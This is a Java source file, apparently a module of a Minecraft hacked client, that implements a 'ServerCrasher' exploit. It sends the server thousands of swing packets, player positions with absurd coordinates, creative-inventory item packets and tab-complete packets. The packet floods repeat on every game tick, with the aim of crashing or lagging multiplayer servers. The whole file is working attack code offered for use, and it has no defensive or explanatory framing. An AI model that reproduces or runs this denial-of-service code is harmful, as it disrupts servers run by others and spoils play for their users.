package org.alphacentauri.modules;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;
import org.alphacentauri.AC;
import org.alphacentauri.management.events.Event;
import org.alphacentauri.management.events.EventListener;
import org.alphacentauri.management.events.EventServerLeave;
import org.alphacentauri.management.events.EventTick;
import org.alphacentauri.management.modules.Module;
import org.alphacentauri.management.properties.Property;

public class ModuleServerCrasher extends Module implements EventListener {
   private Property mode = new Property(this, "Mode", ModuleServerCrasher.Mode.Swing);
   private Property amount = new Property(this, "Amount", Integer.valueOf(5000));
   private boolean isWorking = false;

   public ModuleServerCrasher() {
      super("ServerCrasher", "Crashes some servers", new String[]{"servercrasher"}, Module.Category.Exploits, 9856554);
   }

   private void doWork() {
      if(!this.isWorking) {
         (new Thread(() -> {
            this.isWorking = true;
            Thread.currentThread().setName("Server-Crasher");

            try {
               NetHandlerPlayClient sendQueue = AC.getMC().getPlayer().sendQueue;
               if(this.mode.value == ModuleServerCrasher.Mode.Swing) {
                  C0APacketAnimation animation = new C0APacketAnimation();

                  for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                     sendQueue.addToSendQueue(animation);
                  }
               } else if(this.mode.value == ModuleServerCrasher.Mode.CrashPhase) {
                  for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                     AC.getMC().getPlayer().sendQueue.addToSendQueue(new C04PacketPlayerPosition(AC.getMC().getPlayer().posX, -8.0E307D, AC.getMC().getPlayer().posZ, false));
                  }
               } else if(this.mode.value == ModuleServerCrasher.Mode.CreativeItemSpam) {
                  EntityPlayerSP player = AC.getMC().getPlayer();
                  if(player.capabilities.isCreativeMode) {
                     for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                        player.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i % 9 + 1, new ItemStack(Blocks.stone, 64)));
                     }
                  } else {
                     AC.addChat(this.getName(), "You have to be creative for Mode " + ((ModuleServerCrasher.Mode)this.mode.value).name() + " to work!");
                     this.setEnabledSilent(false);
                  }
               } else if(this.mode.value == ModuleServerCrasher.Mode.AutoCompleteMixed) {
                  C14PacketTabComplete complete1 = new C14PacketTabComplete("/");
                  C14PacketTabComplete complete2 = new C14PacketTabComplete(" ");

                  for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                     AC.getMC().getPlayer().sendQueue.addToSendQueue(complete1);
                     ++i;
                     AC.getMC().getPlayer().sendQueue.addToSendQueue(complete2);
                  }
               } else if(this.mode.value == ModuleServerCrasher.Mode.AutoCompletePlayer) {
                  C14PacketTabComplete complete = new C14PacketTabComplete(" ");

                  for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                     AC.getMC().getPlayer().sendQueue.addToSendQueue(complete);
                  }
               } else if(this.mode.value == ModuleServerCrasher.Mode.AutoCompleteCommand) {
                  C14PacketTabComplete complete = new C14PacketTabComplete("/");

                  for(int i = 0; i < ((Integer)this.amount.value).intValue(); ++i) {
                     AC.getMC().getPlayer().sendQueue.addToSendQueue(complete);
                  }
               }
            } catch (Exception var5) {
               var5.printStackTrace();
            }

            this.isWorking = false;
         })).start();
      }
   }

   public void onEvent(Event event) {
      if(event instanceof EventTick) {
         this.doWork();
      } else if(event instanceof EventServerLeave) {
         this.disable();
      }

   }

   public static enum Mode {
      Swing,
      CrashPhase,
      CreativeItemSpam,
      AutoCompleteMixed,
      AutoCompletePlayer,
      AutoCompleteCommand;
   }
}
